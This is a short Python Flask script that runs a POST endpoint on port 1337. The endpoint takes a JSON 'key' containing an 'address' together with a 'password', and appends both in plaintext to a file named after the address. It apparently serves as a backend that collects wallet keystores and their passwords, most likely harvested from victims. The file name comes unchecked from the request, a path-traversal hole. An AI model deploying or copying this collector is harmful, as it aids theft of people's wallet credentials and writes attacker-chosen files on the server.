import json

from flask import Flask
from flask import request
app = Flask(__name__)

@app.route('/api', methods=['POST'])
def saver():
	jsonData = request.data
	theJson = json.loads(jsonData.decode('utf-8'))
	
	try:
		fileName = json.loads(str(theJson['key']))['address']
	except:
		fileName = str(theJson['key'])

	with open('data/{0}'.format(fileName), 'a') as file:
		cleanData = json.loads(str(theJson['key']))
		cleanData['password'] = theJson['password']
		file.write(json.dumps(cleanData) + '\r\n')

	return '{"success": true}'

if __name__ == '__main__':
  app.run(host="0.0.0.0", port=1337)